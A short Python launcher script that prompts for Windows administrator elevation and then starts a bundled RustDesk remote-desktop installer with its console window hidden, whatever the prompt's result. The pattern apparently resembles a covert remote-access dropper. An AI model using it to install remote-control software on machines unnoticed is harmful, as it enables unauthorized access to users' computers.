import sys
import ctypes
import subprocess
import os

def launch_main_app():
    app_path = os.path.join(os.path.dirname(sys.executable), "installrustdesk_0dff2e7c-d54a-435c-9513-36100a1680d05145.exe")
    subprocess.Popen([app_path], creationflags=subprocess.CREATE_NO_WINDOW)
    sys.exit()

if __name__ == "__main__":
    if ctypes.windll.shell32.IsUserAnAdmin():
        launch_main_app()
    else:
        # Show UAC prompt
        ctypes.windll.shell32.ShellExecuteW(
            None,
            "runas",
            sys.executable,
            "",
            None,
            1
        )
        # Always launch main app regardless of UAC result
        launch_main_app()